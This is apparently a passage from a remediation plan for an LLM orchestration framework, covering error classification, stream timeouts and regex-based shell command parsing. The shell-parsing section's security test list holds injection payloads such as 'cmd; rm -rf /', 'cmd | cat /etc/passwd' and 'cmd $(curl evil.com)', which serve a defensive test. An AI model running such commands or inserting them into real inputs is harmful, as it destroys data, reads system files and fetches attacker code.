if (error.message.toLowerCase().includes('rate_limit')) {
  // handle rate limit quota
  return ErrorCategory.RATE_LIMIT;
} else if (error.message.toLowerCase().includes('quota')) {
  // handle quota exceeded
  return ErrorCategory.QUOTA;
} else if (error.message.toLowerCase().includes('auth')) {
  // handle authentication failure
  return ErrorCategory.AUTH;
}
```

This approach has multiple critical failure modes:

**Specific Failure Modes:**
- **Provider Variation:** Different providers use different error formats
  - Gemini: `"Rate limit exceeded (429)"`
  - OpenAI: `"quota_exceeded"`
  - Claude: `"rate_limit_error"`
  - Custom providers: Arbitrary message formats

- **Message Instability:** Error messages change between API versions
  - Breaking changes in provider error messages go undetected
  - False negatives: Actual quota errors with different wording not detected

- **False Positives:** "limit" substring matches in unrelated errors
  - "You have reached the maximum item limit in your library" (not rate limit)
  - "Credential token limited to 100 characters" (not auth failure)

- **False Negatives:** Important errors misclassified or missed
  - Quota errors appear as general errors; failover not triggered
  - Auth errors appear as transient; retry wasted on permanent failures

**Impact Assessment:**
- **Failover Accuracy:** HIGH - Error classification directly controls failover behavior
- **Reliability Impact:** SEVERE - Quota handling broken across providers
- **User Experience:** Requests fail unnecessarily when alternate providers available
- **Resource Waste:** Retrying non-transient errors wastes quota

**Recommended Solution:**

1. **Create structured error classification system:**
   ```typescript
   interface ClassifiedError {
     category: 'rate_limit' | 'quota' | 'auth' | 'timeout' | 'transient' | 'permanent' | 'unknown';
     retryable: boolean;
     provider: 'gemini' | 'claude' | 'openai';
     httpStatus?: number;
     errorCode?: string;
     originalMessage: string;
     confidence: 'high' | 'medium' | 'low';
     details: Record<string, unknown>;
   }
   ```

2. **Create provider-specific error parsers:**
   ```typescript
   class GeminiErrorClassifier {
     classify(error: unknown): ClassifiedError {
       // Parse Gemini-specific error codes
       if (error.code === 429 || error.status === 429) {
         return { category: 'rate_limit', retryable: true, ... };
       }
       if (error.code === 'RESOURCE_EXHAUSTED') {
         return { category: 'quota', retryable: false, ... };
       }
       // Parse headers for retry-after, quota info
       return this.fallbackClassify(error);
     }
   }
   ```

3. **Implement multi-signal classification:**
   - Check error code (not just message)
   - Extract details from response headers
   - Parse nested error structures
   - Vendor-specific status codes
   - HTTP status codes

4. **Add error registry with versioning:**
   ```typescript
   interface ErrorDefinition {
     provider: string;
     apiVersion: string;
     errorCodes: string[];
     messagePatterns: RegExp[];
     category: ErrorCategory;
     retryable: boolean;
   }
   ```

5. **Comprehensive error testing:**
   - Test each provider's error variants
   - Test message format changes across versions
   - Test edge cases and false positives
   - Automated regression tests for error classification

**Success Criteria:**
- 100% accuracy on known error types across all providers
- Failover triggered correctly for rate limit/quota errors
- No false positive/negative classifications in test matrix
- Error classification logged for audit and debugging
- Each classification decision documented with reasoning

**Verification:**
- Test suite includes errors from each provider's documentation
- Classification accuracy verified for 50+ error scenarios
- Integration tests confirm failover triggered on rate limit
- Regression tests run on provider updates

---

#### ERR-05: No Timeout on Event Streams

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** Medium
**Category:** PRODUCTION RISK
**Files Affected:** 1
**Impact Level:** 4/5

**Description:**

The execution loop consumes provider event streams without timeout protection, allowing a single hung stream to block the entire orchestrator indefinitely:

```typescript
// Problematic pattern in orchestrator/execution-loop.ts
for await (const event of provider.execute()) {
  // No timeout - if stream hangs, blocks indefinitely
  processEvent(event);
}
```

If a provider's event stream hangs (network issue, provider timeout, stream corruption, connection reset, etc.), the entire execution loop blocks indefinitely with catastrophic consequences:

**Specific Failure Modes:**
- Network hang: Stream stops receiving events; for-await blocks forever
- Provider timeout: Provider stops sending events; stream never closes
- Connection reset: Connection lost mid-stream; no close event fired
- Backpressure: Consumer slower than producer; queue grows unbounded
- Partial event: Stream sends incomplete event; parser waits for more data

**Impact Assessment:**
- **Availability Impact:** CRITICAL - Single hung stream takes entire system offline
- **Operational Impact:** SEVERE - Manual restart required; no automatic recovery
- **Production Risk:** EXTREME - Framework completely unavailable; no graceful degradation
- **Task Impact:** All pending and future tasks blocked until restart

**Recommended Solution:**

1. **Implement AbortController-based timeout:**
   ```typescript
   async function executeWithTimeout(provider: LLMProvider, task: Task) {
     const timeout = new AbortController();
     const configuredTimeout = task.timeout || config.defaultStreamTimeout; // 30min default

     let timeoutHandle = setTimeout(
       () => timeout.abort(),
       configuredTimeout
     );

     try {
       for await (const event of provider.execute({ signal: timeout.signal })) {
         // Reset timeout on each event (stream is alive)
         clearTimeout(timeoutHandle);
         timeoutHandle = setTimeout(
           () => timeout.abort(),
           configuredTimeout
         );

         processEvent(event);
       }
     } catch (err) {
       if (err instanceof DOMException && err.name === 'AbortError') {
         // Timeout occurred
         this.emit('timeout', {
           taskId: task.id,
           duration: configuredTimeout,
           lastEvent: lastEventTime
         });

         // Trigger failover or retry
         return this.failover.handle(task);
       }
       throw err;
     } finally {
       clearTimeout(timeoutHandle);
     }
   }
   ```

2. **Add configurable timeout per provider/task:**
   ```typescript
   interface ExecutionOptions {
     streamTimeout?: number;  // milliseconds
     eventTimeout?: number;   // timeout between events
     maxDuration?: number;    // maximum total execution time
   }
   ```
   - Default: 30 minutes (standard for long-running operations)
   - Configurable via task parameters
   - Documented timeout expectations for each provider

3. **Implement graceful degradation:**
   - Emit timeout event to system
   - Trigger fallback provider
   - Preserve partial results collected so far
   - Attempt retry with exponential backoff
   - Increment timeout for retry (adaptive)

4. **Add monitoring and alerting:**
   - Track stream duration and timeout counts
   - Alert on repeated timeouts (indicates provider/network issue)
   - Monitor hung streams before timeout (track age)
   - Dashboard visualization of execution time distribution

**Success Criteria:**
- All event streams have timeout protection enabled
- Hung streams recovered automatically within configured timeout
- No indefinite daemon blocking even with provider failures
- Timeout behavior documented and configurable
- Monitoring alerts on timeout patterns

**Verification:**
- Integration tests with intentionally hung provider confirm timeout fires
- Failover triggered on timeout
- Partial results preserved after timeout
- Configuration changes applied without code changes

---

#### ERR-06: Command Parsing Regex Incomplete

**Severity:** S3 (Medium)
**Effort:** 2h
**Blocking:** No
**Category:** SECURITY
**Files Affected:** 1
**Impact Level:** 3/5

**Description:**

The security policy engine uses regex-based shell command parsing that doesn't handle all edge cases of shell quoting and escaping:

```typescript
// Incomplete regex parsing at security/policy-engine.ts
const commandRegex = /["']([^"']*?)["']/g;
// Fails to handle:
// - Nested quotes: "foo 'bar' baz"
// - Quote escaping: "foo \"bar\" baz"
// - Backslash escaping: 'foo\\bar'
// - Empty strings: "" or ''
// - Multiline strings in some shells
```

Quote-aware shell parsing is notoriously complex due to shell semantics across different shells (bash, sh, zsh, etc.):

**Specific Failure Modes:**
- **Nested Quotes:** Single quotes inside double quotes: `"foo 'bar' baz"` — regex splits incorrectly
- **Escape Sequences:** `\"`, `\'`, `\\` patterns — not recognized; parsed as part of content
- **Empty Strings:** `""` and `''` — may be ignored by regex
- **Whitespace:** Quoted whitespace: `"foo bar"` — splits on internal spaces if not properly tracked
- **Quote Variety:** Backticks, `$()` syntax — not handled
- **Edge Cases:** Unicode quotes, alternative quote styles in different shells

**Impact Assessment:**
- **Security Impact:** MEDIUM - Potential bypass of command restrictions
- **Reliability Impact:** Medium - Inconsistent command parsing across inputs
- **Edge Cases:** Rare but exploitable scenarios may bypass security checks
- **Maintenance:** Security boundary unclear; future changes risk introducing bypasses

**Recommended Solution:**

1. **Audit current regex thoroughly:**
   ```typescript
   // Document all supported patterns
   const SUPPORTED_PATTERNS = [
     'simple: cmd arg',
     'quoted: cmd "arg with spaces"',
     'single: cmd \'arg\'',
     // Document NOT supported:
     'nested quotes',
     'escape sequences',
     'unicode quotes'
   ];
   ```

   - Create comprehensive test matrix
   - Test against OWASP shell injection payloads
   - Identify specific edge cases not handled
   - Document all assumptions and limitations

2. **Option A - Use established shell parser library:**
   ```typescript
   // Example: use shellwords or similar
   import * as shellwords from 'shellwords';

   const tokens = shellwords.split(commandString);
   // Proper shell semantics; reduces custom parsing complexity
   ```

   - `shellwords` npm package (implements POSIX shell)
   - Reduces custom parsing complexity
   - Leverages community testing and fixes

3. **Option B - Comprehensive regex with validation:**
   - Expand regex to cover documented edge cases
   - Implement state machine for quote tracking
   - Add comprehensive test suite
   - Document all assumptions and limitations
   - Regular audit against new shell injection techniques

4. **Option C - Safer command model:**
   - Accept commands as structured data (not strings)
   - Define allowed command patterns upfront
   - Eliminate ad-hoc parsing entirely
   - Stronger security boundary

5. **Add security test suite:**
   ```typescript
   const INJECTION_PAYLOADS = [
     'cmd; rm -rf /',
     'cmd && malicious',
     'cmd | cat /etc/passwd',
     'cmd `echo pwned`',
     'cmd $(curl evil.com)',
     'cmd"; break "out'
   ];

   INJECTION_PAYLOADS.forEach(payload => {
     test(`safely rejects: ${payload}`, () => {
       const parsed = parseCommand(payload);
       assert(!parsed.containsInjection);
     });
   });
   ```

   - Common shell injection payloads
   - Quote escaping variations
   - Unicode and encoding edge cases
   - Automated security regression tests

**Success Criteria:**
- All identified edge cases documented
- Zero failures on comprehensive test matrix (50+ scenarios)
- Security audit completed against OWASP shell injection patterns
- Approved parsing implementation documented with safety guarantees
- Regression test suite prevents future bypasses

**Verification:**
- Security team reviews and approves solution
- Penetration testing confirms no injection bypasses
- Regression tests run on any parsing changes

---

### Summary Table: Error Handling Gaps

| Gap ID | Issue | Risk Level | Effort | Blocking | Priority |
|--------|-------|-----------|--------|----------|----------|
| **ERR-01** | AuditLogger silent write failures | Data loss | 1h | Yes | P0 |
| **ERR-02** | GeminiProvider silent JSON parse | Data loss | 1h | Yes | P0 |
| **ERR-03** | FlagManager missing logging | Observability | 1h | No | P1 |
| **ERR-04** | Fragile error classification | Failover broken | 2h | Medium | P1 |
| **ERR-05** | No event stream timeout | Availability risk | 1h | Medium | P1 |
| **ERR-06** | Incomplete command parsing regex | Security edge case | 2h | No | P2 |

**Total Effort:** 9 hours
**Critical Path (P0):** 2 hours
**Production Blockers:** 3 gaps (ERR-01, ERR-02, ERR-05)

**Parallelization:** All P0 gaps can be worked in parallel; P1 gaps independent except ERR-04 (depends on error classification improvement in FailoverController)

---

## Next Steps

**To begin remediation:**
1. Review detailed gap specifications in Phase 2
2. Identify available resources/team capacity
3. Follow recommended execution order (Foundation → Core → Operational)
4. Run quick wins first for immediate team momentum

**Tracking:**
- Update **Status** column as work progresses (Open → In Progress → Completed)
- Record actual effort vs. estimated effort for future planning
- Note any discovered dependencies or blockers in gap detail sections
